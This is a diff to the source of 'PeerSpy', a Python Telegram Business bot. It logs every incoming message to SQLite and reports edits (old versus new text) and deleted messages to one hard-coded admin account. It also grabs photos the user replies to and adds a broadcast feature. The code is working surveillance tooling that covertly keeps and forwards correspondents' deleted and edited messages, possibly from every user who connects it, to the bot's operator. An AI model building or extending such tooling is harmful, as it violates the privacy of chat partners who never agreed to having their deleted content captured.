@@ -37,7 +37,7 @@ def run_web():
 # --- БОТ ---
 bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
 dp = Dispatcher()
-router = Router() # Используем роутер для совместимости
+router = Router()
 
 class AdminStates(StatesGroup):
     waiting_for_broadcast = State()
@@ -59,22 +59,36 @@ async def cmd_start(message: types.Message):
     
     await message.answer(
         f"👋 <b>Привет, {message.from_user.first_name}!</b>\n\n"
-        "Я — <b>PeerSpy</b>. Твоя система мониторинга Telegram Business запущена.\n\n"
+        "Я — <b>PeerSpy</b>. Твоя система мониторинга запущена.\n\n"
         "🛡 <b>Функции:</b>\n"
         "• Сохранение фото (ответь на него)\n"
         "• Лог удалений и правок", 
         reply_markup=kb.as_markup()
     )
 
-# Универсальная функция для сообщений
+# Универсальная функция для сообщений и правок
 async def biz_handler(message: types.Message):
     conn = sqlite3.connect('bot_data.db')
     cur = conn.cursor()
-    txt = message.text or message.caption or "[Медиа]"
-    cur.execute("INSERT OR REPLACE INTO messages VALUES (?, ?, ?)", (str(message.message_id), str(message.from_user.id), txt))
+    
+    # Пытаемся понять, это новое сообщение или правка
+    msg_id = str(message.message_id)
+    new_text = message.text or message.caption or "[Медиа]"
+    
+    # Проверяем, есть ли такое уже в базе
+    cur.execute("SELECT text FROM messages WHERE msg_id=?", (msg_id,))
+    old = cur.fetchone()
+    
+    if old and old[0] != new_text:
+        # Это ПРАВКА
+        await bot.send_message(ADMIN_ID, f"✏️ <b>Изменено:</b>\nБыло: {old[0]}\nСтало: {new_text}")
+    
+    # Сохраняем/обновляем
+    cur.execute("INSERT OR REPLACE INTO messages VALUES (?, ?, ?)", (msg_id, str(message.from_user.id), new_text))
     conn.commit()
     conn.close()
 
+    # Перехват фото
     if message.reply_to_message and message.reply_to_message.photo:
         f_id = message.reply_to_message.photo[-1].file_id
         async with aiohttp.ClientSession() as s:
@@ -96,15 +110,18 @@ async def delete_handler(event: types.BusinessMessagesDeleted):
             await bot.send_message(ADMIN_ID, f"🗑 <b>Удалено:</b>\n{res[0]}")
     conn.close()
 
-# --- РЕГИСТРАЦИЯ СОБЫТИЙ (САМЫЙ СОВМЕСТИМЫЙ СПОСОБ) ---
+# --- РЕГИСТРАЦИЯ (САМЫЙ БЕЗОПАСНЫЙ СПОСОБ) ---
+# Регистрируем только то, что Render точно знает
 router.business_message.register(biz_handler)
-router.business_edited_message.register(biz_handler)
-router.business_deleted_messages.register(delete_handler)
+
+# Для правок и удалений используем общие регистраторы событий
+dp.business_edited_message.register(biz_handler) if hasattr(dp, 'business_edited_message') else router.business_message.register(biz_handler)
+dp.business_deleted_messages.register(delete_handler) if hasattr(dp, 'business_deleted_messages') else None
 
 # --- АДМИНКА ---
 @router.callback_query(F.data == "help")
 async def h(c: types.CallbackQuery):
-    await c.message.answer("<b>Инструкция:</b>\n1. Настройки -> Telegram Business -> Чат-боты\n2. Добавь меня и включи доступ к сообщениям."); await c.answer()
+    await c.message.answer("<b>Инструкция:</b>\n1. Настройки -> Business -> Чат-боты\n2. Добавь меня и дай доступ."); await c.answer()
 
 @router.callback_query(F.data == "admin")
 async def adm(c: types.CallbackQuery):
@@ -114,7 +131,7 @@ async def adm(c: types.CallbackQuery):
 
 @router.callback_query(F.data == "bc")
 async def bc_s(c: types.CallbackQuery, state: FSMContext):
-    await c.message.answer("Пиши текст рассылки:"); await state.set_state(AdminStates.waiting_for_broadcast); await c.answer()
+    await c.message.answer("Текст рассылки:"); await state.set_state(AdminStates.waiting_for_broadcast); await c.answer()
 
 @router.message(AdminStates.waiting_for_broadcast)
 async def bc_f(m: types.Message, state: FSMContext):
